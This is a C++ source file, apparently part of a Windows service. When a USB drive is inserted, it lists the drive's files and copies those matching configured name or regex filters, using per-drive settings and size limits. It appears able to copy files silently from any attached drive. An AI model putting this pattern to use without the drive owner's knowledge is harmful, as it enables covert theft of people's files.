#include "stdafx.h"
#include "Device.h"
#include <memory>
#include <list>
#include <fstream>
#include <sstream>
#include <string>
#include "FileLister.h"
#include <filesystem>
#include "Convert.h"
#include "FileSearcher.h"
#include "FileCopyer.h"
#include "SystemConfig.h"
#include "sql_connection_error.h"
#include "SQLConnection.h"
#include "Log.h"
#include "Base64Encoder.h"
#include "Base64Decoder.h"
using namespace std;
using namespace filesystem;

typedef SystemConfig::ListenMode ListenMode;
typedef SystemConfig::ConfigData ConfigData;
typedef SystemConfig::ConfigData::DeviceConfig DeviceConfig;

void DeviceArrivalMain(TCHAR DriveLetter) {
	SystemConfig* config = SystemConfig::getInstance();
	Device dv(DriveLetter);
	Device::DiskInformation info = dv.GetDiskInformation();
	unsigned int SN = info.VolumeSerialNumber;
	ConfigData data = config->readConfig();

	if (!data.Service.Enabled)
		return;

	vector<DeviceConfig> &deviceExcept = data.Service.DeviceConfig;
	DeviceConfig sdc = data.Service.DefaultConfig;
	for (const DeviceConfig& cfg : deviceExcept) {
		if (cfg.SerialNumber == SN) {
			sdc = cfg;
			break;
		}
	}
	if (sdc.ListenMode == ListenMode::DISABLED)
		return;

	FileLister lister(dv);
	shared_ptr<list<FileData>> list = lister.ListFile();
	FileCopyer copyer(dv);
	FileSearcher searcher;
	if (sdc.FileListerEnabled) {
		copyer.ListFile(list);
	}
	if (sdc.FileCopyer.NormalCopyEnabled) {
		auto ptr = searcher.FindFile(list, sdc.FileCopyer.NormalFilters);
		copyer.setPaths(ptr);
		copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
	}
	if (sdc.FileCopyer.RegexCopyEnabled) {
		auto ptr = searcher.FindFileRegex(list, sdc.FileCopyer.RegexFilters);
		copyer.setPaths(ptr);
		copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
	}
}

void DeviceRemovalMain(TCHAR DriveLetter) {
	
}

// Usually this function should be empty.
void InitProgram() {
	SystemConfig::getInstance()->readConfig();
}